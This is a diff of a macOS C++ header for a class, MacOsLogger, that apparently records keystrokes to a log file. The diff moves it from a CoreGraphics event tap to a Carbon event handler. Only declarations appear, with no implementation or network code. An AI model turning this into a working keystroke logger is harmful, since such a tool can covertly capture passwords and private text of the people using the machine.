@@ -3,36 +3,30 @@
 #if defined(__APPLE__)
 #include <iostream>
 #include <fstream>
-#include <string>
-#include <unordered_map>
-#include <ctime>
 #include <chrono>
-#include <stdexcept>
-#include <filesystem>
+#include <ctime>
+#include <iomanip>
 #include <map>
-
-#include <CoreGraphics/CoreGraphics.h>
+#include <stdexcept>
+#include <sys/stat.h>
 #include <CoreFoundation/CoreFoundation.h>
 #include <ApplicationServices/ApplicationServices.h>
 #include <Carbon/Carbon.h>
-#include <utility>
 
 class MacOsLogger
 {
 public:
-    explicit MacOsLogger(std::filesystem::path logFilePath);
+    MacOsLogger();
     ~MacOsLogger();
+
     void startLogging();
 
 private:
-    void handleKeyPress(CGKeyCode keyCode);
-    std::string convertKeyCode(int keyCode) const;
-    void initializeKeyMap();
-    static CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void* refcon);
-
-    std::filesystem::path logFilePath;
+    std::string logFileName;
     std::ofstream logFile;
-    std::map<int, std::string> keyMap;
-};
+    std::map<UInt32, std::string> keyMap;
 
+    static OSStatus eventHandler(EventHandlerCallRef nextHandler, EventRef event, void* userData);
+    void initializeKeyMap();
+};
 #endif
